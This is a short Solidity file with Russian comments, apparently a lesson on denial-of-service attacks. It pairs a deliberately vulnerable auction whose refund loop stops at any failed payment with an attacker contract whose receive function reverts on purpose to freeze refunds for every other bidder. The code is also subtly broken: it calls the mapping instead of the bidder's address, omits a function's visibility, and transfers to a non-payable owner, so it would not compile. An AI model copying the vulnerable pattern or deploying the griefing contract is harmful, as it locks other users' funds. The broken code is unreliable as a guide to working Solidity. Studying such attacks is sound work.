// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;


// тут нас просто заддосят
contract DosAuction {
    mapping(address => uint) public bidders;
    address[] public allBidders;
    uint public refundProgress;
    function bid() external payable  {
        bidders[msg.sender] += msg.value;
        allBidders.push(msg.sender);
    }

    //push подход
    function refund() external {
        for (uint i = refundProgress; i < allBidders.length; i++){
            address bidder = allBidders[i];
            (bool success,) = bidders.call{value: bidders[bidder]}("");
            require(success, "failed");
            // для защиты лучше всего просто добавить неуспешные в отдельный массив, тк success будет всегда false
            refundProgress++;
        }
    }
}


contract DosAttack {
    DosAuction auction;
    bool hack = true;
    address owner;
    constructor(address _auction) {
        auction = DosAuction(_auction);
        owner = msg.sender;
    }

    function bid() external payable  {
        auction.bid{value: msg.value}();
    }

    function toggleHack(){
        require(msg.sender == owner, 'failed');
        hack = !hack;
    }

    receive() external payable{
        if (hack == true){
            // 1 из 2 ( на самом деле способов уронить ресив больше )
            assert(false);
            while(true){}
        } else {
            owner.transfer(msg.value);
        }

    }

}